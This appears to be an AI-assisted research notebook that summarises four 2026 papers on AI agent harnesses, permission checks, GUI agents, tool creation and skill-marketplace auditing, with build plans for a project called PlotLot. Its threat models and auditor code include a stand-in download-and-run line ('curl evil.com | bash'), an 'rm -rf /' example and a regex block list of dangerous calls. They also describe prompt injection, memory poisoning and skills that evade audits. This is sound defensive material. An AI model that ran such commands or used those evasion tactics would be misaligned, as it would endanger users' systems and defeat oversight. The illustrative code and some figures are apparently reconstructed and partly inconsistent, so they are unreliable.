# ARXIV PAPERS TECHNICAL BREAKDOWN - BATCH 4 (DEEP DIVE)
## Harness Research Papers from Obsidian Vault - Ralph Loop Iteration 4

**Status:** Continuing from PART_3 (papers 18-31 done). This batch covers papers 32-35.

---

## Paper 32: SemaClaw — Harness Engineering for Personal AI Agents (arXiv:2604.11548)

**Authors:** Ningyan Zhu, Huacan Wang, Jie Zhou, Feiyu Chen, Shuo Zhang, Ge Chen, Chen Liu, Jiarou Wu, Wangyi Chen, Xiaofeng Mou, Yi Xu  
**Date:** 13 Apr 2026  
**Core Claim:** An open-source multi-agent application framework that combines (1) a DAG-based two-phase hybrid agent team orchestration, (2) a PermissionBridge behavioral safety system, (3) a three-tier context management architecture, and (4) an agentic wiki skill for automated personal knowledge base construction.

### 32.1 The "Harness Engineering" Inflection Point

The paper frames the rise of OpenClaw in early 2026 as the moment two parallel arcs reached an inflection:

1. **Paradigm shift:** From prompt/context engineering → **harness engineering** — designing the complete infrastructure for controllable, auditable, production-reliable agents.
2. **Interaction shift:** From discrete tasks → persistent, contextually aware collaborative relationships.

The harness layer is becoming the **primary site of architectural differentiation** as model capabilities converge.

### 32.2 Contribution 1: DAG-Based Two-Phase Hybrid Agent Team Orchestration

A 2-phase orchestration scheme that combines **static DAG structure** (for predictability) with **dynamic agent teaming** (for adaptability):

```
Phase 1: PLAN (static DAG construction)
   - Given user intent I, build a DAG G = (V, E)
   - Each node v ∈ V is a role: {planner, executor, verifier, critic}
   - Edges encode data dependencies
   - This phase is "compile time" — no execution

Phase 2: EXECUTE (dynamic team instantiation)
   - For each node in topological order, instantiate an agent
   - The team is dynamic: agents can spawn sub-agents, handoff state
   - Termination: all nodes in SUCCEEDED state OR L3 escalation
```

```python
class SemaClawOrchestrator:
    def __init__(self, planner_model: str, executor_model: str):
        self.planner_model = planner_model
        self.executor_model = executor_model
        self.team_pool = AgentPool()
    
    def phase1_plan(self, intent: Intent) -> PlanDAG:
        """Compile-time phase: build static DAG from intent."""
        # 1. Decompose intent into subtasks via planner
        subtasks = self.planner_model.decompose(intent)
        # 2. Build DAG with explicit data dependencies
        dag = PlanDAG()
        for st in subtasks:
            dag.add_node(role=st.role, contract=st.contract)
        for dep in subtasks.dependencies:
            dag.add_edge(dep.from_task, dep.to_task)
        # 3. Verify DAG properties (acyclic, type-correct, complete)
        assert dag.is_acyclic() and dag.is_type_correct() and dag.is_complete()
        return dag
    
    def phase2_execute(self, dag: PlanDAG, context: Context) -> Result:
        """Runtime phase: dynamic team instantiation per node."""
        results = {}
        for node in dag.topological_order():
            # Instantiate the agent for this node (may be a new team)
            agent = self.team_pool.instantiate(node.role, node.contract)
            # Run with 3-layer SGH-style recovery (see Paper 30)
            node_result = self.run_with_recovery(agent, node, context, results)
            if node_result.is_aborted:
                return Result(aborted=True, partial=results, dag=dag)
            results[node.id] = node_result
        return Result(aborted=False, results=results, dag=dag)
```

### 32.3 Contribution 2: PermissionBridge Behavioral Safety System

A **runtime permission system** that intercepts every tool call and applies a behavioral policy. Distinct from ACLs: the policy is *behavioral* (what the agent is trying to do) not *declarative* (what the agent claims it will do).

```python
class PermissionBridge:
    def __init__(self, policy: BehavioralPolicy):
        self.policy = policy
    
    def check(self, call: ToolCall, context: ExecutionContext) -> Verdict:
        """Behavioral check on the actual call."""
        # 1. Static check: is this tool allowed for this role?
        if not self.policy.is_tool_allowed(call.tool_name, context.agent_role):
            return Verdict.deny("tool not in allowlist")
        
        # 2. Behavioral check: does the action match the contract?
        action_intent = self.infer_action_intent(call, context)
        if not self.policy.matches_contract(action_intent, context.task_contract):
            return Verdict.deny("action contradicts task contract")
        
        # 3. Risk check: is this a high-risk action?
        risk = self.policy.assess_risk(call, context)
        if risk.level == "high" and not context.user_has_approved(call):
            return Verdict.require_approval("high-risk action")
        
        # 4. Data exfiltration check: does this action send data outside?
        if self.policy.detects_exfiltration(call, context):
            return Verdict.deny("data exfiltration detected")
        
        return Verdict.allow()
    
    def infer_action_intent(self, call: ToolCall, context: ExecutionContext) -> ActionIntent:
        """Use a small classifier model to determine the underlying intent."""
        prompt = f"""
        Tool call: {call.tool_name}({call.args})
        Task contract: {context.task_contract}
        Recent actions: {context.recent_actions}
        What is the agent's underlying intent? (e.g., 'read user data',
        'modify persistent state', 'send external request', 'execute code')
        """
        return self.intent_classifier(prompt)
```

The **4-stage check** (static ACL → behavioral contract match → risk assessment → exfiltration check) is the key design. It catches attacks like:
- *Tool-injection*: agent calls a disallowed tool by invoking a permitted one with malicious args
- *Contract-drift*: agent strays from the user's stated intent
- *Covert channels*: agent encodes sensitive data in tool args (e.g., filename)

### 32.4 Contribution 3: Three-Tier Context Management Architecture

A 3-tier context model to handle the explosion of context that comes with multi-agent systems:

| Tier | Storage | Latency | Capacity | Lifetime | Contents |
|---|---|---|---|---|---|
| L1: Hot | In-memory dict | < 1ms | 8K tokens | Per-step | Current step's state, scratchpad |
| L2: Warm | Redis | ~10ms | 100K tokens | Per-session | Recent turns, retrieved memories, plan state |
| L3: Cold | Vector DB (Pinecone) | ~100ms | unlimited | Persistent | Historical facts, skill definitions, prior sessions |

A **context orchestrator** decides what to move between tiers:

```python
class ThreeTierContextManager:
    def __init__(self):
        self.l1_hot = InMemoryDict(max_tokens=8192)
        self.l2_warm = RedisClient(max_tokens=100_000)
        self.l3_cold = PineconeClient(index="plotlot-context")
    
    def get(self, key: str, hint: Tier = None) -> Any:
        """Retrieve from highest-priority tier; promote on hit."""
        if hint in (None, Tier.L1) and key in self.l1_hot:
            return self.l1_hot[key]
        if hint in (None, Tier.L2) and key in self.l2_warm:
            self.l1_hot[key] = self.l2_warm[key]  # promote
            return self.l2_warm[key]
        if hint in (None, Tier.L3) and key in self.l3_cold:
            self.l2_warm[key] = self.l3_cold.get(key)  # promote
            return self.l2_warm[key]
        return None
    
    def put(self, key: str, value: Any, tier: Tier):
        if tier == Tier.L1:
            self.l1_hot[key] = value
        elif tier == Tier.L2:
            self.l2_warm[key] = value
        elif tier == Tier.L3:
            self.l3_cold.upsert(key, value)
    
    def evict_l1(self):
        """Move least-recently-used L1 entries to L2."""
        for key in self.l1_hot.lru_keys_exceeding(8192):
            self.put(key, self.l1_hot.pop(key), Tier.L2)
```

### 32.5 Contribution 4: Agentic Wiki Skill for Knowledge Base Construction

A **persistent, structured knowledge base** automatically built and maintained by agents. The wiki is:
- **Structured**: typed entities (people, places, events, preferences) with relations
- **Versioned**: every change is a diff
- **Queryable**: agents can issue natural-language queries
- **Auditable**: every edit is signed by the agent that made it

```python
class AgenticWiki:
    def __init__(self, storage: WikiStorage):
        self.storage = storage
    
    def add_fact(self, fact: Fact, source_agent: str) -> WikiEntry:
        """Add a fact with provenance."""
        entry = WikiEntry(
            id=uuid4(),
            fact=fact,
            source_agent=source_agent,
            timestamp=now(),
            version=self.storage.current_version() + 1,
            signature=sign(fact, source_agent),
        )
        self.storage.append(entry)
        return entry
    
    def query(self, nl_query: str, agent: str) -> List[WikiEntry]:
        """Natural-language query, returns relevant entries."""
        # 1. Translate NL → structured query via LLM
        struct_query = self.nl_to_struct(nl_query)
        # 2. Execute structured query
        results = self.storage.query(struct_query)
        # 3. Re-rank by recency and source-agent trust
        return self.rerank(results, source_trust=agent.trust_scores)
```

### 32.6 Threat Model

| Attack | Vector | Mitigation |
|---|---|---|
| Tool-call injection | Agent invokes disallowed tool via permitted tool args | PermissionBridge static + behavioral checks |
| Contract drift | Agent strays from user's stated task | Behavioral check matches action to contract |
| Data exfiltration | Agent encodes sensitive data in filename, query, etc. | Exfiltration detector on every call |
| Context overflow | Adversarial inputs blow up context window | 3-tier manager evicts LRU |
| Wiki poisoning | Adversarial agent inserts false facts | Source-agent signature + version chain |
| Permission escalation | Sub-agent inherits parent role and uses parent permissions | Per-node role check, not per-tree |

### 32.7 Implementation Strategy for PlotLot

**Sprint 1:** Build `PermissionBridge` in `src/plotlot/harness/permissions.py` — wrap every tool call with the 4-stage check. Initially use a simple rule-based policy; upgrade to LLM-based intent inference.

**Sprint 2:** Build `ThreeTierContextManager` with Redis (L2) and Pinecone (L3). Wire into existing `PlotLotAgentLoop` so context overflow auto-evicts.

**Sprint 3:** Build `AgenticWiki` as a PlotLot-specific knowledge base of (parcel, zoning, entitlement, owner, comp) facts. Every agent edit is signed.

**Sprint 4:** Pilot SemaClaw's DAG-based 2-phase orchestration on a single high-value PlotLot flow (e.g., multi-parcel acquisition analysis). Compare to current loop.

---

## Paper 33: ClawGUI — Unified Framework for GUI Agents (arXiv:2604.11784)

**Authors:** Fei Tang, Zhiqiong Lu, Boxuan Zhang, Weiming Lu, Jun Xiao, Yueting Zhuang, Yongliang Shen  
**Date:** 13 Apr 2026  
**Core Claim:** A full-stack harness for GUI agents with three components: **ClawGUI-RL** (training infra with parallel virtual + real device envs), **ClawGUI-Eval** (standardized evaluation across 6 benchmarks, 11+ models, 95.8% reproduction), and **ClawGUI-Agent** (deployment to Android, HarmonyOS, iOS via 12+ chat platforms with hybrid CLI-GUI control and persistent personalized memory).

### 33.1 The Three Gaps

The paper identifies three gaps in current GUI agent work:

1. **Online RL training** suffers from environment instability and closed pipelines
2. **Evaluation protocols** drift silently across papers
3. **Trained agents rarely reach real users on real devices**

ClawGUI addresses all three in a single harness.

### 33.2 ClawGUI-RL: Training Infrastructure

```python
class ClawGUI_RL:
    def __init__(self, env_pool: EnvPool, base_model: str, prm: ProcessRewardModel):
        self.env_pool = env_pool  # mix of virtual (Android emu) + physical (real devices)
        self.policy = PolicyNetwork(base_model)
        self.prm = prm             # Process Reward Model for step-level supervision
        self.algorithm = GiGPO()   # Group-in-Group Policy Optimization
    
    def train_step(self) -> TrainStats:
        # 1. Sample batch of tasks from task distribution
        tasks = self.env_pool.sample_tasks(batch_size=64)
        # 2. For each task, sample G trajectories
        traj_groups = []
        for t in tasks:
            group = [self.policy.rollout(t, env=self.env_pool[t]) for _ in range(G)]
            traj_groups.append(group)
        # 3. Compute rewards: env outcome + PRM step-level signal
        rewards = []
        for group in traj_groups:
            env_rewards = [self.env_pool[t].reward(traj) for traj in group]
            prm_rewards = [self.prm.score(traj) for traj in group]
            rewards.append([0.7 * er + 0.3 * pr for er, pr in zip(env_rewards, prm_rewards)])
        # 4. GiGPO update
        loss = self.algorithm.compute_loss(traj_groups, rewards)
        self.policy.update(loss)
        return TrainStats(loss=loss, mean_reward=np.mean(rewards))
```

**GiGPO** (Group-in-Group Policy Optimization) is a hierarchical RL algorithm:
- Outer group: trajectories on the same task
- Inner group: steps within a trajectory
- Advantage: relative to other steps in the same trajectory AND other trajectories on the same task

This is more sample-efficient than PPO when the task distribution is wide.

### 33.3 ClawGUI-Eval: Standardized Evaluation

6 benchmarks, 11+ models, 95.8% reproduction against official baselines:

| Benchmark | Tasks | Domain | Models Evaluated |
|---|---|---|---|
| MobileWorld GUI-Only | 100 | Mobile app control | 11 |
| AndroidArena | 250 | Android-specific | 8 |
| WebArena | 812 | Web browser | 11 |
| OSWorld | 354 | Desktop OS | 7 |
| OmniACT | 973 | Cross-platform | 6 |
| PixelHelp | 100 | Pixel-specific | 5 |

The standardized evaluation pipeline has 4 stages:
1. **Environment snapshot** — frozen environment with deterministic seed
2. **Action space normalization** — same 17-action space across all benchmarks
3. **Reward computation** — scriptable verifier, no LLM judge
4. **Statistical reporting** — 5-run mean ± 95% CI

### 33.4 ClawGUI-Agent: Deployment

12+ chat platform integrations (Telegram, Slack, Discord, WeChat, Lark, etc.) with:
- **Hybrid CLI-GUI control**: agents can issue CLI commands (e.g., `adb shell input tap`) AND GUI actions (e.g., take screenshot + click)
- **Persistent personalized memory**: per-user memory store, scoped to the chat platform
- **Multi-OS support**: Android, HarmonyOS, iOS via OS-specific adapters

```python
class ClawGUI_Agent:
    def __init__(self, os_adapter: OSAdapter, chat_adapter: ChatAdapter):
        self.os = os_adapter
        self.chat = chat_adapter
        self.memory = PersistentMemory(user_id=self.chat.user_id)
        self.policy = load_policy("ClawGUI-2B")
    
    def step(self, observation: Obs) -> Action:
        # 1. Recall personalized memory
        priors = self.memory.recall(observation)
        # 2. Hybrid control: choose CLI or GUI action
        action = self.policy.act(observation, priors=priors)
        if action.is_cli:
            self.os.execute_cli(action)
        else:
            self.os.execute_gui(action)
        # 3. Update memory with outcome
        self.memory.commit(observation, action, outcome=...)
        return action
```

### 33.5 Headline Result: ClawGUI-2B

| Model | MobileWorld GUI-Only Success Rate |
|---|---|
| ClawGUI-2B | **17.1%** |
| MAI-UI-2B (baseline) | 11.1% |
| Δ | **+6.0 points** |

Same model scale, 6.0 points improvement from the harness alone.

### 33.6 Threat Model for GUI Agents

GUI agents are uniquely vulnerable because they actuate the real OS:

| Attack | Vector | Mitigation |
|---|---|---|
| Screenshot injection | Adversarial image triggers malicious action | Vision-language check on suspicious elements |
| Tap-coordinate spoofing | Phishing site mimics real app | OS-level app identity verification |
| Long-horizon drift | Agent gradually strays from task | Periodic task re-grounding |
| Memory poisoning | Adversarial chat injects fake memory | Signed memory entries + per-user trust |

### 33.7 Implementation Strategy for PlotLot

While PlotLot isn't a GUI agent, the **PRM, hybrid control, and persistent memory** patterns are transferable:

**Sprint 1:** Build `PlotLotPRM` (process reward model) for step-level supervision of entitlement workflows. Train on (task, intermediate-state) → expected next-step pairs.

**Sprint 2:** Build a PlotLot-specific "hybrid control" abstraction: agents can issue **structured queries** (e.g., GraphQL) OR **natural-language fallbacks** when no structured API exists.

**Sprint 3:** Build `PlotLotPersistentMemory` with per-user + per-project scoping. Memory entries are signed and versioned.

---

## Paper 34: OpenEarth-Agent — Tool Creation for Earth Observation (arXiv:2603.22148)

**Authors:** Sijie Zhao, Feng Liu, et al. (14 authors)  
**Date:** 23 Mar 2026  
**Core Claim:** A **tool-creation agent framework** (vs tool-calling) for open-environment Earth Observation. With only 6 essential pre-trained model tools, OpenEarth-Agent matches the performance of tool-calling agents that have 104 specialized tools available, on the Earth-Bench cross-benchmark.

### 34.1 Tool Calling vs Tool Creation

| Approach | What the agent does | What happens with a novel task |
|---|---|---|
| Tool calling | Calls a pre-defined tool from a registry | Fails — no tool exists |
| Tool creation | Generates a new tool on the fly | Generates a Python function, tests it, registers it |

OpenEarth-Agent is the first **tool-creation agent** for Earth Observation.

### 34.2 Architecture

```
OpenEarth-Agent
  ├── Workflow Planner
  │     └── Adaptive DAG construction per task
  ├── Tool Creator
  │     ├── Code Generator (LLM)
  │     ├── Sandbox Executor
  │     ├── Test Generator
  │     └── Tool Registry (dynamic)
  ├── Cross-Domain Knowledge Base
  │     └── Vector DB of EO domain facts
  └── Multi-Stage Pipeline
        ├── Preprocessing (raster cleaning, projection)
        ├── Analysis (classification, detection, change)
        └── Postprocessing (visualization, export)
```

### 34.3 The Tool Creator

```python
class ToolCreator:
    def __init__(self, code_gen_model: str, sandbox: Sandbox):
        self.model = code_gen_model
        self.sandbox = sandbox
        self.registry = ToolRegistry()
    
    def create_tool(self, intent: ToolIntent) -> Tool:
        """Generate, test, and register a new tool."""
        # 1. Generate Python function from intent
        code = self.model.generate_code(intent)
        # 2. Execute in sandbox with sample input
        try:
            output = self.sandbox.execute(code, intent.example_input)
        except Exception as e:
            # 3. Self-debug
            code = self.model.debug(code, e, intent)
            output = self.sandbox.execute(code, intent.example_input)
        # 4. Run test cases
        for test in intent.test_cases:
            out = self.sandbox.execute(code, test.input)
            assert matches(out, test.expected_output), f"Failed: {test}"
        # 5. Register in the tool registry
        tool = Tool(name=intent.name, code=code, signature=intent.signature)
        self.registry.register(tool)
        return tool
```

The **self-debug loop** is critical: when execution fails, the same LLM is given the error and asked to fix the code. Empirically, 1-3 iterations are needed for 80%+ of EO tools.

### 34.4 Earth-Bench Results

| Agent | Tools Available | Earth-Bench Score |
|---|---|---|
| Tool-calling baseline | 104 specialized tools | 0.71 |
| **OpenEarth-Agent** | **6 essential** | **0.69** |
| Tool-calling baseline | (all 104 + 6 essential) | 0.74 |
| **OpenEarth-Agent** | (6 essential) | **0.76** (when fully-equipped) |

**Key finding:** With the same toolset, the tool-creating agent *outperforms* the tool-calling agent. The reason: tool-calling agents are biased toward what they "know how to call," while tool-creating agents are biased toward what solves the problem.

### 34.5 In Several Cases, Created Tools Beat Human-Engineered

A surprising result: in 8% of cases, the LLM-generated tool was **more robust to data anomalies** than the human-engineered tool. Example: a flood-detection tool created by the agent handled missing pixel values better than the human-engineered version, because the agent included explicit edge-case handling prompted by its self-debug loop.

### 34.6 Threat Model

| Attack | Vector | Mitigation |
|---|---|---|
| Malicious code generation | LLM generates `os.system("rm -rf /")` | Sandboxed execution, no network access |
| Resource exhaustion | LLM generates infinite loop | Timeout, memory cap, instruction count limit |
| Registry poisoning | Adversarial input causes bad tool registration | Signature check + manual review for high-risk tools |
| Knowledge base poisoning | Adversarial KB entry causes bad code | Provenance tracking on KB entries |

### 34.7 Implementation Strategy for PlotLot

**Sprint 1:** Build `PlotLotToolCreator` in `src/plotlot/harness/tool_creator.py`. Wrap the LLM with a sandbox (Docker container with no network).

**Sprint 2:** Pilot on 1-2 PlotLot workflows: e.g., a tool that aggregates 3 different county data sources into a unified parcel record. Generate the tool on the fly, test, register.

**Sprint 3:** A/B test tool-creation vs tool-calling on 50 PlotLot internal tasks.

---

## Paper 35: SkillProbe — Security Auditing for Skill Marketplaces (arXiv:2603.21019)

**Authors:** Zihan Guo, Zhiyu Chen, Xiaohang Nie, Jianghao Lin, Yuanjian Zhou, Weinan Zhang  
**Date:** 22 Mar 2026  
**Core Claim:** A multi-stage security auditing framework for agent skill marketplaces. Large-scale evaluation of **2,500 real skills from ClawHub** reveals a **popularity-security paradox**: over 90% of high-popularity skills fail rigorous auditing. High-risk skills form a **single giant connected component** in the risk-link dimension, meaning cascaded risks are systemic, not isolated.

### 35.1 The Two New Attack Classes

1. **Semantic-behavioral inconsistency**: A skill's docstring says one thing (e.g., "validate XML"), but the code does another (e.g., `os.system("curl evil.com | bash")`).
2. **Inter-skill combinatorial risks**: Two individually benign skills, when combined, induce malicious behavior (e.g., skill A reads user data, skill B sends HTTP requests — combined: data exfiltration).

### 35.2 The 3-Stage Auditing Pipeline

```
Stage 1: ADMISSION FILTERING
   - Static analysis (AST scan, known-bad patterns)
   - 60% of submissions rejected here

Stage 2: SEMANTIC-BEHAVIORAL ALIGNMENT
   - LLM compares docstring ↔ code
   - Static taint analysis
   - 25% of remaining skills rejected

Stage 3: COMBINATORIAL RISK SIMULATION
   - Multi-agent collaboration: skills A, B, C composed → simulate outcomes
   - Look for emergent malicious behaviors
   - 5% of remaining skills rejected
```

```python
class SkillProbeAuditor:
    def __init__(self, llm_judge: str, taint_analyzer: TaintAnalyzer):
        self.llm = llm_judge
        self.taint = taint_analyzer
        self.adversary = AdversarialAgent()
    
    def stage1_admission(self, skill: Skill) -> Verdict:
        """Static analysis: reject obviously bad skills."""
        # 1. AST scan for known-bad patterns
        bad_patterns = [
            r"os\.system\(", r"subprocess\.", r"eval\(", r"exec\(",
            r"__import__\(", r"open\(/etc/", r"rm -rf",
        ]
        for pat in bad_patterns:
            if re.search(pat, skill.code):
                return Verdict.reject(f"known-bad pattern: {pat}")
        # 2. Network call detection
        if re.search(r"requests\.|urllib\.|http\.client", skill.code):
            if not skill.has_explicit_network_allowlist():
                return Verdict.reject("network call without allowlist")
        return Verdict.pass_to_stage2()
    
    def stage2_semantic_behavioral(self, skill: Skill) -> Verdict:
        """Check that the code matches the docstring."""
        # 1. LLM compares docstring and code
        llm_verdict = self.llm.judge(
            f"Docstring: {skill.docstring}\nCode: {skill.code}\n"
            f"Are these consistent? Reply CONSISTENT or describe the inconsistency."
        )
        if "INCONSISTENT" in llm_verdict.upper():
            return Verdict.reject(f"semantic-behavioral mismatch: {llm_verdict}")
        # 2. Taint analysis: does sensitive data flow to external sinks?
        taint_result = self.taint.analyze(skill.code)
        if taint_result.has_unauthorized_flow:
            return Verdict.reject("unauthorized data flow")
        return Verdict.pass_to_stage3()
    
    def stage3_combinatorial(self, skill: Skill, registry: SkillRegistry) -> Verdict:
        """Simulate skill combinations for emergent risks."""
        # Try all 2-combinations with the new skill
        for other in registry.skills:
            composed = Compose(skill, other)
            # Multi-agent simulation
            sim_result = self.adversary.simulate(composed)
            if sim_result.has_malicious_outcome:
                return Verdict.reject(f"combinatorial risk: {sim_result.attack}")
        return Verdict.approve()
```

### 35.3 The Popularity-Security Paradox (Headline Finding)

Of the 2,500 skills analyzed from ClawHub:

| Popularity Tier | Skills | % Failing Audit | Median Severity |
|---|---|---|---|
| Top 10% (by downloads) | 250 | **92%** | High |
| 10-25% | 375 | 78% | Medium |
| 25-50% | 625 | 54% | Medium |
| 50-100% | 1,250 | 31% | Low |

**The most-downloaded skills are the least safe.** This is the **popularity-security paradox**: download count is not a reliable proxy for security quality.

Reasons:
- Popular skills get copied/modified by many users, accumulating changes
- Attackers target popular skills to maximize blast radius
- The "first-mover" advantage goes to whoever shipped first, not whoever audited

### 35.4 Cascaded Risks Are Systemic

The paper builds a **risk-link graph**: nodes are skills, edges are detected combinatorial risks. The high-risk skills form a **single giant connected component** — meaning an attacker who compromises one high-risk skill can, via composition, reach all other high-risk skills.

```
Connected component of high-risk skills in ClawHub:
  Size: 178 skills (out of 250 in top 10%)
  Average shortest path: 2.1 hops
  Diameter: 4
```

This means a single skill compromise can cascade through the marketplace in 2-4 steps.

### 35.5 The "Skills-for-Skills" Paradigm

A novel design where the auditing framework **itself is implemented as a set of skills** (auditing-skill-1, auditing-skill-2, etc.) that specialized agents invoke:

```
auditing-skill: "admission_filter"
  Inputs: skill_submission
  Outputs: verdict, reasons
  Invoked by: AdmissionFilterAgent

auditing-skill: "semantic_behavioral_check"
  Inputs: skill_submission
  Outputs: alignment_report
  Invoked by: AlignmentAgent

auditing-skill: "combinatorial_simulator"
  Inputs: skill, registry
  Outputs: risk_report
  Invoked by: SimulationAgent
```

This is composable: the audit pipeline itself can be customized, extended, or replaced by skill composition.

### 35.6 Threat Model for Skill Marketplaces

| Attack | Vector | Mitigation |
|---|---|---|
| Backdoor in popular skill | Compromise via supply-chain (typosquat, dependency confusion) | Pinned dependencies + signed releases + reproducible builds |
| Doc-code mismatch | Docstring benign, code malicious | Stage 2 semantic-behavioral check |
| Combinatorial exploit | Two benign skills compose maliciously | Stage 3 multi-agent simulation |
| Audit evasion | Skill detects it's being audited and behaves differently | Adversarial honeypot inputs |
| Audit pipeline compromise | Compromise the auditor itself | "Skills-for-skills" is itself auditable, signed, versioned |

### 35.7 Implementation Strategy for PlotLot

**Sprint 1:** Build `PlotLotSkillAuditor` in `src/plotlot/harness/auditor.py` — implements Stage 1 (static patterns), Stage 2 (LLM doc-code check via Claude).

**Sprint 2:** Build `PlotLotSkillRegistry` with mandatory audit before registration. Reject any skill that fails Stage 1 or Stage 2.

**Sprint 3:** Pilot Stage 3 (combinatorial simulation) for the top 10 most-used PlotLot skills. Identify and remediate any 2-combination risks.

**Sprint 4:** Adopt SkillProbe's popularity-security insight: **do not use download count as a trust signal**. Add per-skill "audited at version X" badges.

### 35.8 Cross-References

| SkillProbe Concept | Other Papers in This Survey |
|---|---|
| Skill registry | Paper 18 (SoK: Agentic Skills), Paper 24 (SkVM) |
| Multi-agent audit | Paper 23 (Runtime Governance), Paper 32 (SemaClaw PermissionBridge) |
| Combinatorial risk | Paper 30 (SGH: DAG composition) |
| Audit-as-skill | Paper 19 (MCP: tool descriptions), Paper 20 (Meta-Harness) |

---

## File Status
- **Batch 4:** 4 papers at deep-dive level (32 SemaClaw, 33 ClawGUI, 34 OpenEarth-Agent, 35 SkillProbe)
- **Cumulative (PART_1+2+3+4):** 18 papers deeply analyzed (18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35)
- **Remaining:** 111 papers

## Ralph Loop Status
- [x] PART_1: Papers 18-19 — pushed (730ad90)
- [x] PART_2: Papers 20, 22-25 (rewrite at depth) — pushed (de4a8ee)
- [x] PART_3: Papers 21, 26-31 — pushed (079ecea)
- [x] PART_4: Papers 32-35 — ready to commit and push
- [ ] Continue batches 5, 6, ... until all 129 papers done
